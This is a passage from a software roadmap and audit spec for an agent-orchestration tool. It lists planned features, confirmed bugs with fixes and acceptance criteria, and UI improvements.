team of coding agents in parallel: plan in chat, watch a kanban, let it run
autonomously, get pinged remotely, and step in mid-run without breaking things.

### F1. First-run onboarding wizard (highest product impact)

Today a new user lands on an empty Board with 9 nav tabs and no guidance. Turn the
existing SetupView into a guided first-run flow:

- On load, if there are no projects **and** setup has never completed, route to a
  `Welcome` page: step 1 shows the three CLI checks (`/api/setup`, already built)
  with fix-it hints per failure (install command, login command, copy-paste ready);
  step 2 model roster — read the user's actual `opencode models` output (new
  endpoint `GET /api/setup/models` shelling `opencode models`) and let them
  enable/disable + map the roster instead of hand-editing IDs blind; step 3 routing
  defaults with a one-line explanation of difficulty tiers and the
  author-vs-validator rule; step 4 (optional) budgets + Telegram; step 5 "Create
  your first project" → existing NewProject.
- Persist `settings.onboardedAt`. Add "Re-run setup" link on SetupView.
- Files: new `apps/web/src/pages/Welcome.tsx`, `App.tsx` routing, `setup.ts`
  (+models endpoint), types.

### F2. Task detail drawer (make the black box explainable)

The Board's selected-task strip is cramped and hides the decision trail. Add a
right-side drawer (click a card) with tabs:

- **Overview**: description, acceptance criteria (checkable display), scope paths,
  model + fallback chain, attempts timeline (one row per run: model, duration —
  needs B4 — cost, exit reason).
- **Logs**: the existing live log panel + history (needs B2), with source filter
  (engine/agent/gate/validator) and auto-follow toggle.
- **Review**: latest `GateResult` as pass/fail chips with expandable output,
  validator verdicts with reasons + confidence (from `merge_decisions` — add
  `GET /api/tasks/:id/decisions`, repo fn exists).
- **PR**: diff viewer (exists), PR link, rollback/retry buttons (exist).
- Files: new `apps/web/src/components/TaskDrawer.tsx`, Board refactor, one new
  route + types entry.

### F3. Mid-run control (the user explicitly wants this)

With B1/B3/B9 done, expose real mid-run intervention in the UI:

- **Stop this task** button on running cards (B1), with a confirm.
- **Add a task while running**: a "+ Add task" affordance on the Board (title,
  description, difficulty, scope, deps picker) → `POST /api/projects/:id/tasks`
  (new route, materialize a single task) → picked up live via B9.
- **Reprioritize**: drag between Backlog/Ready columns → PATCH status (B5 rules).
- **Pause modes**: split Pause into "Pause (finish current tasks)" — set
  `paused` but let active tasks complete (new orchestrator flag `drain`) — and
  "Stop now" (current abort behavior). Two buttons in ProjectHeader.
- Files: orchestrator (drain flag), engine-runner, index.ts (add-task route),
  Board/ProjectHeader, types.

### F4. Live "mission control" strip on the Board

The user wants to glance and know what the team is doing. Add a slim strip above
the columns: one row per **active agent** (model avatar, task title, elapsed time,
last-activity heartbeat — the activity map already exists in Board.tsx), plus
project burn: spend so far vs budget with a thin progress bar (data already in
`costAnalytics`), and count of pending approvals (deep-link to Notifications).
Files: new `apps/web/src/components/MissionControl.tsx`, Board.

### F5. Notifications that reach the user (not just a tab)

- **Browser notifications** (Notification API) for `action_required` and task
  failures when the tab is hidden; permission requested from Settings.
- **Approval deep links**: Telegram approval messages should include the PR URL
  and top validator reasons (data exists on the notification/decision) so the user
  can decide from the phone without opening the app.
- **Digest setting**: `settings.telegram.digest: "off" | "terminal" | "all"` —
  "terminal" (default) pushes only done/failed/approval; "all" adds per-attempt
  progress. Wire in `EngineRunner.onTaskUpdated`/`taskStatus`.
- Files: `useToast`-style `useBrowserNotify` hook, telegram.ts, engine-runner,
  Settings page, types.

### F6. Model health + subscription awareness

For the multi-subscription audience, per-model observability:

- **Health panel** on SetupView: last `testModels` result per model (persist
  results to a small `model_checks` table with ts), rolling failure rate from
  `runs` (exit_reason error/stuck per model), median run duration.
- **Rate-limit cooldown**: when an adapter failure looks like a rate limit
  (`/rate.?limit|429|too many requests|quota/i` on the summary), mark the model
  "cooling down" in-memory for N minutes (EngineRunner map) and have the
  orchestrator's dispatch skip it (treat like budget-blocked, log once) so the
  fallback chain routes around it instead of burning attempts.
- Files: adapters (classify exitReason `rate_limited`), orchestrator (skip set),
  engine-runner, setup.ts, SetupView, types.

### F7. Cost guardrails short of the hard stop

Budget today is a cliff (checkBudget → refuse). Add soft rails:

- Warning notifications at 50% / 80% of project budget and global monthly budget
  (emit once per threshold — track in a `budget_alerts` table or settings JSON),
  pushed via WS + Telegram.
- Board budget bar turns amber/red at the thresholds (data exists in analytics).
- Per-task estimate chip on Ready cards ("~$0.03") using the existing
  `getModelRunAverages`.
- Files: budget.ts (threshold helper), engine-runner (check after each cost
  record), CostView/Board, types.

### F8. Autonomous-run report card

When a run ends (the `finally` in `EngineRunner.start`), generate a **run
summary**: tasks done/failed, total cost, duration, PRs merged (links), approvals
that were required, and the top failure reasons — persist as an `audit_log` entry
(kind `run_summary`) and send it to Telegram (the `info` push exists but is one
line — make it the digest). Render past run summaries at the top of AuditView.
This is the "get updates" feature for away-from-keyboard autonomy. Optional
(behind a toggle): pipe the summary through the `updates`-role model (Grok) for a
natural-language paragraph — but the mechanical digest must not depend on a model.
Files: engine-runner, repo (audit query by kind), AuditView, telegram.

### F9. Project templates & per-project gate config

- Per-project overrides (new `projects.config` JSON column): gate script names
  (which npm scripts count as gates — the P2 roadmap item; repos vary),
  `maxAttempts`, merge policy override, and a "test command" free-field for
  non-npm stacks (run via execFile with args split, no shell).
- `GateRunnerImpl` reads the override through a new `SchedulerDeps.gateConfig`.
- NewProject gains an "Advanced" accordion for these; sensible defaults unchanged.
- Files: types, schema (+migration in db/index.ts), gate-runner, engine-runner,
  NewProject/ProjectHeader.

### F10. Ship it like a product: packaging & deployment

- **Serve the built web app from the server** (the Round-3 note in
  ARCHITECTURE.md): `@fastify/static` on `apps/web/dist` when it exists;
  `npm run start` = build all + run server; then one port, no CORS in prod (S2).
- **Single-command run**: root scripts `npm run start` (prod) and `npm run setup`
  (interactive: create `.env`, run setup checks in terminal). A `bin` entry
  (`hoopedorc` CLI: `start|init`) so `npx`/global install works.
- **systemd unit + Dockerfile** in `deploy/` (Docker mounts the repos dir, the
  DB, and the user's `~/.config` for gh/claude/opencode auth — document the
  caveats; native + systemd is the primary path since the CLIs need auth).
- **Versioning**: keep a real CHANGELOG.md for the orchestrator itself; tag
  releases.
- Files: server (static serving), package.json(s), deploy/, README.

### F11. Docs for other users

README today is contributor-oriented. Add `docs/USER_GUIDE.md`: what it is (3
paragraphs), install + prerequisites (subscriptions needed per model, opencode
auth walkthrough), first project tutorial (plan chat → review table → start →
watch board → approval on Telegram), the safety model (gates, validator,
risky-change rules, budgets, rollback), remote setup (Tailscale + HOST +
API_TOKEN from S2), and a troubleshooting table built from the real failure modes
in NEXT_STEPS.md (PWD bug symptoms, opencode lock collisions, vacuous gates…).
Link it from the README and the app's Setup page.

### F12. Multi-project run queue — LOW priority

`engine.orchestrators` already supports concurrent projects, but they compete for
the same models (per-model `maxConcurrent` is enforced per-orchestrator, not
globally — two projects can each run 2 deepseek-flash tasks). Move
`modelActiveCount` up to a shared registry in `EngineRunner` passed via deps so
per-model caps hold across projects. UI: Projects page shows per-project
running/paused status with start/pause inline (mostly exists).

### F13. Sandbox mode for agents & gates — FUTURE (note only, don't build now)

The honest security posture (S5, B11) is "agents and repo scripts execute on the
host". A `SANDBOX=container` mode running each worktree's agent + gates inside a
disposable container (repo mounted, no host env, network-restricted) is the real
fix. Requires the CLIs authenticated inside the image — significant work; design
doc first (`docs/specs/sandbox.md`), do not attempt as part of this pass.
**F18 wrote that design doc** — see [`docs/specs/sandbox.md`](specs/sandbox.md)
for goals/non-goals, the container-auth problem, worktree mount model, network
policy, env sanitization, gates-in-container, and the phased rollout. Still no
implementation — F13 itself remains future work.

---

## Part 3 — Review-pass fixes & next features (Fable audit, 2026-07-05)

Produced by independently auditing the merged Phase 6 code (PRs #37–#40) plus
the surrounding areas it touches — every "Problem" below was confirmed against
the actual code on `main` at `v0.1.0`, not inferred from the progress notes.

**Workflow (same as Parts 1–2, plus):**
- One branch/PR per item (or a small coherent batch), item IDs in commit
  messages, update the Phase 7/8 tables in the Progress section as you land.
- Verification bar is unchanged: typecheck/build/engine+adapter tests green,
  and live verification against a real (non-mock) server for anything with a
  runtime surface. **Put the verification evidence in the PR description** —
  Fable re-verifies each item after merge and will use those as the checklist.
- For browser verification: the Chrome extension tool has TWO connected
  browsers on this account. Call `list_connected_browsers` first and select
  the **macOS one marked `isLocal: true`** ("Browser 1") — the other is a
  remote Windows browser that cannot reach this Mac's localhost and produces
  misleading "Frame with ID 0 is showing error page" errors on every call.

### B16. Dockerfile build stage certainly fails — HIGH (broken artifact)

**Where:** `deploy/Dockerfile` lines 8–12.

**Problem:** every workspace `tsconfig.json` (all five: types, adapters,
engine, server, web) contains `"extends": "../../tsconfig.base.json"`, but the
build stage only copies `package*.json`, `packages/`, and `apps/` — so
`RUN npm run build` fails on the missing base tsconfig. Separately, the root
`package.json` declares `"bin": { "hoopedorc": "./bin/hoopedorc.mjs" }` and a
`setup` script pointing at `scripts/init.mjs`; neither `bin/` nor `scripts/`
is copied, and `npm ci` errors (ENOENT) when linking a declared bin whose file
doesn't exist — so even the install step is at risk, not just the build. This
was shipped labeled "unverified reference" but it is *deterministically*
broken, which is worse than unverified.

**Fix:** in the build stage, before `RUN npm ci`, add:
```dockerfile
COPY tsconfig.base.json ./
COPY bin ./bin
COPY scripts ./scripts
```

**Acceptance (no Docker daemon on this machine — simulate the build context):**
copy *exactly* the paths the Dockerfile COPYs (after the fix) into a fresh temp
dir — `package.json`, `package-lock.json`, `tsconfig.base.json`, `bin/`,
`scripts/`, `packages/`, `apps/` and nothing else (no root `node_modules`, no
`.env`, no `docs/`) — then run `npm ci && npm run build` inside it. Both must
succeed. Delete the temp dir after.

### B17. A configured-but-missing gate script silently passes — HIGH (safety rail gap)

**Where:** `packages/engine/src/gate-runner.ts` — `runGate()` (~line 55) and
the `gates?.testScript` string branch of `runTestsGate()` (~line 76).

**Problem:** F9's override plumbing routes `runGate(cwd, slot, override)` →
`runScript(cwd, override || slot)`, and `runScript` returns
`{ passed: true, ran: false }` when `hasNpmScript()` doesn't find the script.
That behavior is *correct* for the default slot names (it's the B11 vacuous
mechanism: repo simply has no "lint" script → nothing to run → vacuous check
catches the aggregate). But an **explicitly configured** override that names a
missing script — a typo (`"tc:strict"` vs `"tc-strict"`), or the repo renaming
its scripts later — silently passes the gate with `ran: false`, and the
vacuous check only fires if *all four* gates ran nothing. Contrast:
`testCommand` already fails loudly when its command doesn't exist, with a
comment explaining exactly this reasoning ("explicitly configured by the
operator, so any failure … is a real gate failure"). The same rule must apply
to explicit script-name overrides.

**Fix:**
1. In `runGate()`: when `typeof scriptOverride === "string"` and
   `!hasNpmScript(cwd, scriptOverride)` → return
   `{ passed: false, ran: true, output: 'configured gate script "<name>" not found in package.json' }`.
2. Same guard in `runTestsGate()`'s `gates?.testScript` string branch before
   it calls `runScript`.
3. **Do NOT touch the default-slot path.** A missing *default* script
   ("typecheck"/"lint"/"build"/"test"/"tests" with no override) must keep
   returning `{ passed: true, ran: false }` — that is the vacuous-gate
   machinery and existing tests depend on it.

**Acceptance:** new unit tests in `gate-runner.test.ts`: (a) override →
missing script fails the gate with "not found" in the output; (b) testScript
override → missing script fails the tests gate; (c) the existing default-slot
tests (missing default scripts pass with `ran: false`, vacuous aggregate) stay
green untouched.

### B18. A capacity-blocked project waits in total silence — MEDIUM (observability)

**Where:** `packages/engine/src/orchestrator.ts` — the
`active >= cfg.maxConcurrent` skip (~line 362) that F12 gave the
`blockedByCapacity` flag.

**Problem:** budget blocks and cooldown blocks each emit a warn-once log
(`budgetBlockedWarned` / `cooldownBlockedWarned`); the capacity skip emits
nothing. Post-F12 the cap is global, so a project can now sit polling at 250ms
for *minutes* waiting on another project's model slot with zero log lines —
on the Board it is indistinguishable from a hang.

**Fix:** mirror the existing pattern exactly: add
`private readonly capacityBlockedWarned = new Set<string>();`, clear it in
`start()` alongside the other two `.clear()` calls, emit warn-once
(`"Model at capacity (in use by another task or project), holding: <model>"`,
level `"warn"`, source `"engine"`, with the task id) when the capacity skip
fires, and `capacityBlockedWarned.delete(task.id)` on the dispatch path right
where the budget/cooldown warned-sets are deleted.

**Acceptance:** unit test: shared-registry deps hooks pre-loaded at the cap →
loop runs several passes → exactly one capacity warn log for the task; then
`decModelActive` mid-test → task dispatches and completes.

### B19. Manual dispatch is invisible to the global model cap — MEDIUM

**Where:** `packages/engine/src/orchestrator.ts` `runTask()` (~line 472);
stale doc-comment on `manualRuns` in `packages/server/src/engine-runner.ts`.

**Problem:** `runTask` (the `/dispatch` path) never calls
`incModel`/`decModel`, so a manually-dispatched task doesn't count toward the
shared F12 registry — an autonomous loop will happily dispatch `maxConcurrent`
*more* copies of the same model on top of it. The F12 PR documented this as
intentional; on reflection it's half-right: a manual dispatch *shouldn't be
blocked* by the cap (an explicit human action must not silently queue), but it
*must be visible* to everyone else's capacity accounting.

**Fix:** in `runTask`, before `executeTask`:
`this.incModel(task.assignedModel); this.runningModel.set(task.id, task.assignedModel);`
— and in the `finally`, replicate `start()`'s dispatch-finally exactly
(fallback escalation can switch the model mid-run, so decrement
`this.runningModel.get(task.id) ?? task.assignedModel`, then delete from
`runningModel` and `activeTaskIds`). Do **not** add a capacity *check* to
`runTask` — count it, don't block it. Update the `manualRuns` doc-comment in
`engine-runner.ts`, which currently states manual runs "never contribute to
that count" — after this fix they do.

**Known-and-accepted (do not "fix", just leave this note):** fallback
escalation (`switchRunningModel`) increments the next model without checking
its cap — a task already in flight escalating to a busy model may transiently
exceed the cap. Blocking mid-task on capacity would risk deadlock; the
transient overshoot is the lesser evil.

**Acceptance:** unit test: `runTask` holds model X (blocking adapter,
`maxConcurrent: 1`, shared registry hooks) → a second Orchestrator's `start()`
with a ready task on X does not author until the manual run resolves; both
finish `done`.

### S6. Auth polish: real login screen, constant-time compare, doc note — MEDIUM

**Where:** `apps/web/src/api/client.ts` (~line 71: `window.prompt`),
`packages/server/src/index.ts` auth hook (~line 560: `bearer !== token`),
`docs/USER_GUIDE.md` (Remote setup section).

**Problem:** three leftovers. (1) The `window.prompt()` token entry was
explicitly flagged back in S2's notes as a stopgap "F1 should replace" — F1
never did. (2) The bearer comparison uses `!==`, not a constant-time compare
(low risk behind Tailscale, but it's a one-liner to do right). (3) When
`API_TOKEN` is set, the SPA shell + JS assets are still served without auth
(only `/api/*` and `/ws` are guarded) — this is *by design* (the shell
contains no data) but is documented nowhere.

**Fix:**
1. **Login screen.** New `apps/web/src/components/TokenGate.tsx`: a small
   centered card (token password-input, error line, submit) in the app's
   existing dark style. `client.ts`: replace the `window.prompt` block with a
   registered handler — `export function setUnauthorizedHandler(h: () => Promise<string | null>)`;
   on 401, `await` the handler, store the token (same localStorage key,
   `"hoopedorc.apiToken"`), retry once; a second 401 after retry surfaces as a
   normal error (the handler shows it and re-asks on the next call). `App.tsx`
   registers a handler that renders TokenGate and resolves with the entered
   token. **Constraints:** (a) when auth is off — the default — nothing may
   render or flash: TokenGate appears only after a real 401; (b) no WS changes
   needed — `useWS` already reads `getStoredApiToken()` on every reconnect
   attempt and backoff-retries, so it picks up the new token by itself
   (verify this during live-testing, don't re-implement it); (c) after this,
   `grep -r "window.prompt" apps/web/src` must return nothing.
2. **Constant-time compare.** In the server auth hook, compare via
   `node:crypto`'s `timingSafeEqual` on UTF-8 buffers with a length guard
   (length mismatch → reject without calling timingSafeEqual, which throws on
   unequal lengths). Apply to both the bearer header and the `?token=` query
   param paths.
3. **Docs.** One short paragraph in USER_GUIDE's Remote setup: the app shell
   itself is served without a token; all data still requires one.

**Acceptance:** live-verified in a real browser against a real server booted
with `API_TOKEN=...`: first load shows the in-app TokenGate (no browser
prompt); wrong token → inline error, stays on the gate; correct token → app
loads fully *including live WS events* (start a project or trigger any WS
event to prove the socket authenticated); with auth off, the gate never
appears. Typecheck/build green.

### F14. CI for this repo — GitHub Actions (highest leverage, do first in Phase 8)

The repo has **zero CI** — every "green" claim in Phases 1–6 was a local run.
Ironic, given the product's premise is enforcing gates.

- New `.github/workflows/ci.yml`: trigger on `pull_request` and on `push` to
  `main`. Single job on `ubuntu-latest`: `actions/checkout@v4`,
  `actions/setup-node@v4` with `node-version: 22` and `cache: npm`, then
  `npm ci`, `npm run typecheck`, `npm run build`, `npm test -w @orc/engine`,
  `npm test -w @orc/adapters`. No secrets are needed (nothing in the test
  suites touches a real model or GitHub).
- Do **not** add a Docker build step (B16 makes the Dockerfile buildable in
  principle, but there's no need to spend CI minutes proving it every PR).
- Note: engine tests spawn real `npm`/`git` subprocesses (gate-runner tests
  create temp repos) — both exist on ubuntu-latest runners; no extra setup.

**Acceptance:** the workflow runs green on its own PR (visible via
`gh pr checks`). After merge, `main` shows a green check.

### F15. "Wait for GitHub checks" merge gate (old P2 roadmap item)

Local gates can't see the target repo's own CI. Add an **opt-in, per-project**
gate that holds an auto-merge until the PR's GitHub checks pass.

- **Types:** `ProjectConfig` gains `requireGithubChecks?: boolean` and
  `githubChecksTimeoutMin?: number` (default 15). Extend `parseProjectConfig`
  in `packages/server/src/index.ts` (boolean; integer 1–120) and the
  `ProjectConfigFields` Advanced accordion (checkbox + number input). Update
  CONTRACT.md's ProjectConfig paragraph.
- **Engine:** `GitService` gains
  `waitForChecks(project, prNumber, timeoutMs): Promise<"passed" | "failed" | "none" | "timeout">`,
  implemented in `git-service.ts` with `gh pr checks <n> --repo <owner/repo>`
  polled every ~15s (execFile arg arrays, as everywhere else in that file).
  **Before writing it, verify the installed `gh`'s actual behavior by hand**
  (`gh pr checks --help`, and run it against a real PR): exit 0 = all checks
  passed; non-zero = failing OR still pending (parse stdout to tell them
  apart); and the no-checks-configured case prints a distinctive
  "no checks reported" style message — map that to `"none"`. Do not trust
  this paragraph over the real CLI: check first, as B7/F9 did.
- **Orchestrator:** in `executeTask`, after the validator approves and before
  the merge (near the `canAutoMerge` call, ~line 856): if
  `project.config?.requireGithubChecks`, await `waitForChecks`. `"passed"` /
  `"none"` → proceed. `"failed"` / `"timeout"` → do NOT merge; route into the
  existing `requestApproval` escalation with the reason ("GitHub checks
  failed" / "timed out after Nmin") so a human decides. **While polling, emit
  an info log line per poll** ("Waiting for GitHub checks (Xm)…") — the stuck-
  task detector watches log activity, and a silent multi-minute wait would
  trip it (verify against `STUCK_DETECTION` in orchestrator.ts).
- Also honor B1: check `bailIfStopRequested` after the wait returns.

**Acceptance:** engine unit test with a fake GitService covering all four
outcomes (merge proceeds on passed/none; escalates on failed/timeout; nothing
merges after a Stop during the wait). Live verification: optional but ideal —
one run against the throwaway repo with a trivial always-pass workflow.

### F16. Subscription quota awareness (the multi-subscription feature)

Rate-limit cooldowns (F6) react *after* a model starts failing. Subscriptions
have known windows — Claude Pro's usage caps being the motivating case — so
let the operator declare them and route around exhaustion *before* burning
attempts.

- **Types:** `ModelConfig` gains
  `quota?: { windowHours: number; maxRuns?: number; maxCostUsd?: number }`
  (at least one of maxRuns/maxCostUsd must be set for the quota to mean
  anything — validate on settings save). CONTRACT.md note.
- **Server:** `EngineRunner.checkModelQuota(modelId): string | null` — if the
  model's config has a quota, count its runs (`runs` table, `started_at >=`
  now − window) and sum its cost (`costs` table, same window) **across all
  projects**, and return a reason string when either limit is met.
- **Engine:** new optional `SchedulerDeps.checkModelQuota?` hook. Consult it
  in **both** places `checkBudget` is consulted (the dispatch loop ~line 319
  AND the retry/attempt path ~line 502) with identical skip-don't-fail,
  warn-once semantics — new `quotaBlockedWarned` set following the exact
  budget/cooldown pattern (including B18's `.clear()` in `start()` and
  `.delete()` on dispatch).
- **UI:** three small inputs in Settings' ModelsEditor per model (window
  hours, max runs, max cost). Skip dashboards for now; enforcement first.
  (Optional nice-to-have: show "N runs / $X used this window" in SetupView's
  model-health panel — only if cheap.)

**Acceptance:** engine unit test (hook returns a reason → task skipped, warn
logged once, dispatches after the hook returns null). Server-side standalone
script (the established `as any` pattern against a real in-memory SQLite DB):
seed runs/costs rows inside and outside the window, assert the window math —
runs-limit, cost-limit, and no-quota-configured cases.

### F17. DB backup rotation

`deploy/README.md` says "back it up"; nothing does.

- New `packages/server/src/db/backup.ts`: `runBackup(db, dbPath)` — skip
  entirely when the DB is in-memory (`:memory:`) or `ENV.mock`; otherwise use
  better-sqlite3's built-in online backup API (`db.backup(destPath)`, returns
  a promise — **check the installed version's API signature** in
  `node_modules/better-sqlite3/lib` before writing) into
  `DB_BACKUP_DIR` (env; default: `<dirname(dbPath)>/backups/`), filename
  `hoopedorc-YYYY-MM-DD-HHmm.db`; `mkdir -p` the dir; prune to the newest
  `DB_BACKUP_KEEP` (env, default 7).
- Wire in `main()` next to the log-prune scheduling: run on boot + every 24h
  (`setInterval(...).unref()`), try/catch with a warn log — a failed backup
  must never crash the server.
- Add the two env vars to `.env.example` + ENV in `config.ts`.

**Acceptance:** boot with a file DB → a backup file appears with today's
timestamp; pre-seed 9 dummy older backup files → pruned to 7 (newest kept);
mock/in-memory boot creates nothing.

### F18. Sandbox design doc — docs only, no code

Write `docs/specs/sandbox.md` fleshing out F13: goals/non-goals, the
authenticated-CLIs-inside-a-container problem (incl. the F10 finding that
Claude Code's login lives in the macOS Keychain → `ANTHROPIC_API_KEY` is the
only container path and bills differently), worktree mount model, network
policy, env sanitization inside vs outside, gates in-container, and a phased
rollout (gates-only sandbox first, agents later). Link it from F13's entry
above and from the README security section. **No implementation.**

### F19. Scheduled runs — IN SCOPE (user opted in 2026-07-06, after Phase 7)

Cron-style "start project X every night" for maintenance tasks. Do after
F14–F17 (needs CI to trust it, and should respect the quota/backup rails
those add). Design: a small `schedule` field on `Project` (or a new table if
multiple schedules per project end up wanted) holding a simple recurrence —
prefer a deliberately dumb interval/time-of-day scheduler over pulling in a
cron-parse dependency unless real cron syntax turns out to be worth the
weight (decide once the shape is clearer). A `setInterval` check (mirroring
the existing log-prune/backup boot+interval pattern in `main()`) compares
current time against each project's next-due time and calls the existing
`EngineRunner.start(project)` path — no new dispatch mechanism, just a timer
that triggers the same button the UI's Start does. Surface it in
`ProjectConfigFields`/`ProjectHeader` (enable + a simple "every day at HH:MM"
or "every N hours" control) alongside F9's other per-project config.

---

## Part 4 — Post-plan audit & UX wave (Fable, 2026-07-06)

Two halves. First, the **audit record** for the merged Phase 7/8 work:
item-level acceptance criteria all held up and CI stayed green, but three
cross-cutting integration defects were found and fixed the same day
(PR [#57](https://github.com/IngeniousArtist/hoopedorc/pull/57)) — they're
recorded as A1–A3 below so the reasoning isn't lost. Second, the **UX
wave**: findings from driving every page of the real app (mock server, real
browser, desktop and phone widths), specced as U1–U10 for Sonnet to
implement top-down. Same ground rules as Parts 1–3 — branch → PR → merge,
CI (F14) green on every PR, verification evidence in PR descriptions,
live-verify anything with a runtime surface. Note the standing rule from
the top of this doc: UI work is live-verified in a real browser (the
`agent-browser` pattern used since Phase 4), not just typechecked.

### A1–A5. Audit record (already fixed — do not re-implement)

- **A1 (PR #57)** — `apps/web/src/api/client.ts`: a fresh page load against
  a token-requiring server fires several `api()` calls at once; each 401
  invoked the TokenGate handler separately, and since `App.tsx` keeps a
  single resolver, each invocation clobbered the previous caller's —
  leaving every earlier call hanging forever (e.g. `listProjects` losing
  the race left the project dropdown on "No projects"). Fixed by sharing
  one in-flight handler promise across all concurrent 401s.
- **A2 (PR #57)** — `checkSchedules` (`packages/server/src/index.ts`) never
  set the project status to `"running"` nor broadcast `project.updated`
  (the `/start` route does both), so a scheduled run showed a stale status
  for its whole duration. Fixed by mirroring the route on successful
  kickoff.
- **A3 (PR #57)** — `isScheduleDue` daily mode required the *exact* HH:MM
  minute; `setInterval(60s)` drift can skip a minute boundary, silently
  losing that day's run. Fixed with a 5-minute grace window (still
  once-per-day; deliberately not retroactive across a server that was down
  at the scheduled time — cron semantics, not anacron).
- **A4** — CHANGELOG.md had no 0.2.0/Phase 7–8 entries; added.
- **A5** — USER_GUIDE.md didn't cover subscription quotas, scheduled runs,
  the GitHub-checks gate, or backups; added (two safety-model bullets plus
  "Scheduled runs" and "Backups & data" sections).

### U1. Global "action required" indicator in the nav — HIGH (the product's core promise)

**Where:** `apps/web/src/App.tsx` (the `NAV` row), data from
`GET /api/notifications` + the global `notification` WS events.

**Problem:** pending approvals — the one thing an unattended run genuinely
blocks on — are only visible in the Board's MissionControl strip or by
opening the Notifications tab. On any other page there is zero indication
that a run is sitting frozen waiting for a human tap.

**Fix:** a count badge on the "Notifications" nav item: number of
notifications with `requiresApproval` and no `respondedWith`. Seed it from
one fetch on mount; keep it live from the (already-global, see B15)
`notification` WS events and decrement on respond. Amber dot/count style
consistent with MissionControl's existing approval chip.

**Acceptance:** with a pending approval, every page shows the badge; tapping
through and responding clears it without a reload; zero pending = no badge
(not a "0").

### U2. Slim ProjectHeader outside the Board — HIGH (screen real estate)

**Where:** `apps/web/src/App.tsx` (renders `ProjectHeader` for every page in
`PROJECT_PAGES`), `apps/web/src/components/ProjectHeader.tsx`.

**Problem:** the full header — budget editor, Advanced config accordion,
Pause/Stop buttons — repeats at full size on Plan, Costs, Audit, and
Notifications, eating ~120px before each page's own content starts. Budget
and gate-config editing have nothing to do with reading the audit log.

**Fix:** give `ProjectHeader` a `compact` prop: one row (name, repo link,
status chip, Start/Pause/Stop). `App.tsx` passes `compact` for every
project page except Board. Board keeps the full editor.

**Acceptance:** Plan/Costs/Audit/Notifications show the one-row header with
working run controls; Board is unchanged; budget/config editing still
reachable on Board.

### U3. Board columns overflow with no affordance — HIGH

**Where:** `apps/web/src/pages/Board.tsx` (column list comes from
`TASK_STATUSES`).

**Problem:** 8 fixed-width columns at 1280px push CHANGES REQ., BLOCKED,
DONE, and FAILED past the right edge with no scroll hint — on first load it
looks like the board has 4–5 columns, and terminal columns (the ones that
tell you what finished/failed) are the hidden ones.

**Fix:** collapse *empty* columns to a slim vertical strip (rotated title +
count 0) that expands on click and on `dragover` (so drag-to-status still
works). Non-empty columns keep full width. Alternative acceptable
implementation: keep all 8 full-width but add a visible horizontal-scroll
affordance + auto-scroll to the busiest column; prefer the collapse.

**Acceptance:** with the mock seed (4 non-empty columns), all 8 states are
visible at 1280px without horizontal scrolling; dragging a card onto a
collapsed empty column still drops correctly; a column with cards never
collapses.

### U4. Unsaved Settings edits are silently discarded — HIGH (data loss)

**Where:** `apps/web/src/pages/Settings.tsx`, `apps/web/src/App.tsx`
(`{page === "settings" && <Settings />}` unmounts it on tab switch).

**Problem:** Settings is one long form (models, routing, budgets, Telegram)
with a Save button; switching to any other tab unmounts the component and
every unsaved edit vanishes without warning.

**Fix:** track dirty state in Settings (compare against the fetched
snapshot, the same dirty-check pattern ProjectHeader's budget row already
uses); expose it to App via a callback or module-level flag; on nav-away
while dirty, `window.confirm` ("Discard unsaved settings changes?") —
cancel keeps the user on Settings. Also make the Save row sticky at the
bottom of the viewport with a visible "unsaved changes" hint so the state
is obvious before it's a problem.

**Acceptance:** edit any field → switch tab → confirm dialog appears;
cancel stays with edits intact; save → switch is silent; the Save control
is visible without scrolling on a 800px-tall window.

### U5. MissionControl elapsed label reads "42s ago elapsed" — TRIVIAL

**Where:** `apps/web/src/components/MissionControl.tsx` (reuses TaskCard's
`agoLabel`, then appends "elapsed").

**Problem:** `agoLabel` returns "42s ago", producing the ungrammatical
"42s ago elapsed" on every active-agent row.

**Fix:** strip the "ago" for this usage — "elapsed 42s" (or "running for
42s"). One-line formatting change; don't change TaskCard's own usage.

**Acceptance:** an active agent row reads "elapsed 42s" (and "elapsed
2m 3s" past a minute).

### U6. Model-reassign dropdown on every kanban card — MEDIUM

**Where:** `apps/web/src/components/TaskCard.tsx` (full `<select>` of the
model roster on every card), `apps/web/src/components/TaskDrawer.tsx`.

**Problem:** every card carries the full model dropdown — visually the
heaviest element on the board, mostly disabled (active tasks can't be
reassigned), and an easy accidental-click target on the cards where it is
enabled.

**Fix:** replace the card's `<select>` with the plain model chip it already
shows elsewhere; move reassignment into TaskDrawer's Overview tab (same
enable/disable rules the card enforces today — only non-active tasks).

**Acceptance:** cards show a static model chip; reassigning from the drawer
updates the card live; active tasks can't be reassigned (control disabled
with the current model shown).

### U7. Schedules are invisible outside the accordion; disabling loses the times — MEDIUM (F19 follow-up)

**Where:** `apps/web/src/components/ProjectConfigFields.tsx`
(`projectConfigFromForm` drops `schedule` entirely when the enable checkbox
is off), `ProjectHeader.tsx` / `pages/ProjectsView.tsx` (no schedule
display anywhere).

**Problem:** (1) a configured schedule shows nowhere except inside the
Advanced accordion — nothing on the header or Projects page says "this
project auto-starts nightly at 03:00", which is exactly the kind of thing
that surprises you at 3am. (2) unchecking "enabled" and saving deletes the
whole schedule object, so re-enabling later starts from blank inputs.

**Fix:** (1) when a schedule exists and is enabled, show a small chip on
ProjectHeader (both variants, see U2) and on the ProjectsView row: "⏱ daily
03:00" / "⏱ every 6h". (2) `projectConfigFromForm`: when the checkbox is
off but times/interval are filled in, emit `{ enabled: false, …times }`
instead of omitting `schedule` — the scheduler already ignores disabled
schedules (`isScheduleDue` checks `enabled` first), so persisting them is
free.

**Acceptance:** an enabled schedule is visible on the header and Projects
row; disable → save → re-enable round-trips the configured times; a
never-configured project shows no chip.

### U8. Headline costs render as "$0.0000" — LOW

**Where:** `apps/web/src/pages/CostView.tsx` (stat tiles),
`apps/web/src/components/BoardSummary.tsx` ("$0.0000 spent").

**Problem:** four-decimal precision makes sense for a $0.0034 per-task
cost, but headline tiles ("Total spend", the board's "spent" figure)
reading "$0.0000" look broken rather than precise.

**Fix:** one shared `formatUsd(n)` helper (e.g. in `apps/web/src/lib/` or
next to the api client): `>= $0.01` → 2 decimals; `> 0` and `< $0.01` → 4
decimals; `0` → "$0.00". Use it for headline stats and the board summary;
keep 4-decimal precision on per-task/per-run rows where sub-cent amounts
are the norm.

**Acceptance:** a fresh project's board reads "$0.00 spent"; a $0.0034 task
row still shows "$0.0034"; a $1.234567 total shows "$1.23".

### U9. "New Project" is a nav tab though it's an action — LOW

**Where:** `apps/web/src/App.tsx` (`NAV` array + the top row with the
project selector).

**Problem:** the tab row mixes places (Board, Costs…) with an action (New
